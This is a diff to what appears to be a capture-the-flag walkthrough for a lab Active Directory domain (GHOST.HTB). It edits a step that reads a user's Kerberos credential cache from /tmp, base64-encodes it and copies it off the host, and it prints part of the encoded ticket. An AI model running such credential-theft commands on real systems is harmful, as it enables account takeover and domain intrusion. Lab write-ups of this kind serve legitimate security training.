@@ -686,7 +686,7 @@ Ill use this ticket to get initial access the domain!
 # Initial access on the domain
 
 ```python
-florence.ramirez@LINUX-DEV-WS01:/$ cat /tmp/krb5cc_50 | base64 | tee /tmp/ticket.b64
+florence.ramirez@LINUX-DEV-WS01:/$ cat /tmp/krb5cc_50 | base64
 BQQADAABAAgAAAAAAAAAAAAAAAEAAAABAAAACUdIT1NULkhUQgAAABBmbG9yZW5jZS5yYW1pcmV6
 AAAAAQAAAAEAAAAJR0hPU1QuSFRCAAAAEGZsb3JlbmNlLnJhbWlyZXoAAAABAAAAAwAAAAxYLUNB
 Q0hFQ09ORjoAAAAVa3JiNV9jY2FjaGVfY29uZl9kYXRhAAAAB3BhX3R5cGUAAAAaa3JidGd0L0dI
@@ -718,7 +718,7 @@ VW8PqTDR5DdIAytV4aoYDgxbE+511Iv95sQWgbqJ2KvW/e+r6ExeKTk1bq07ZOIH4gkUb34GtzE3
 JCQQ35kWYk0ob8VoBv4X7y+mR86FH8XkFLb5fJqGkfYhGlrysvNisD6KUSpNsyMLmb8AAAAA
 ```
 
-Ill encode the output of the ticket in base64 then output it to a file
+Ill encode the output of the ticket in base64 then output it to the screen, ill then copy this to my machine making sure the ticket is on ONE line
 
 ```python
 
